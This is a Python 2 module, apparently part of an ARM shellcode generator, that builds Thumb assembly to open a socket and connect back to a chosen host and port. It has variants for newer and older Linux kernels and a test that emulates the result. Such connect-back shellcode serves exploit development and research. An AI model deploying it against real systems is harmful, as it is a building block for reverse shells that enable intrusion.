from socket import htons, inet_aton, gethostbyname
from struct import unpack

def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337, version=3):
    """Connects to remote machine on specific port

    Args:
        host(str): hostname or IP address

        port(int/str): specific port

        version(int): 2 is old linux kernel including 2.x (default: 3)
    """

    if int(version) == 3:
        sc = """
        movs r0, #2
        movs r1, #1
        subs r2, r2, r2
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #26
        svc 1
        #adr r1, sockaddr_1
        mov r1, pc
        adds r1, #12
        movs r2, #16
        movs r3, #2
        mov r6, r0
        strh r3, [r1]
        b after_sockaddr_2
        subs r1, r1, r1

    sockaddr_1:
        .short 0x4141
        .short %s
        .word  %s
        
    after_sockaddr_2:
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #28
        svc 1
        """ % (htons(int(port)), u32(binary_ip(host)))
        return sc
    elif int(version) == 2:
        # for old linux kernel
        sc = """
        /* socketcall( socket, { 2, 1, 6 } ) */
        movs r1, #2
        movs r2, #1
        movs r3, #6
        push {r1-r3}
        movs r0, #1
        mov  r1, sp
        movs r7, #102
        svc 1

        mov  r6, r0
        /* socketcall(connect, {fd, sockaddr_1, len(sockaddr_1)})  */
        mov  r1, pc
        adds r1, #18
        movs r2, #16
        movs r3, #2
        strh r3, [r1]
        push {r0-r3}
        movs r0, #3
        mov  r1, sp
        movs r7, #102
        svc 1
        b after_connect

    sockaddr_1:
        .short 0x4141
        .short %s
        .word  %s

    after_connect:

        """ % (htons(int(port)), u32(binary_ip(host)))
        return sc
    else:
        print "Not implemented yet"
        return None

def testcase(host='127.0.0.1', port=31337):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('thumb', generate(host, port))[0]
    sclen = len(sc)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
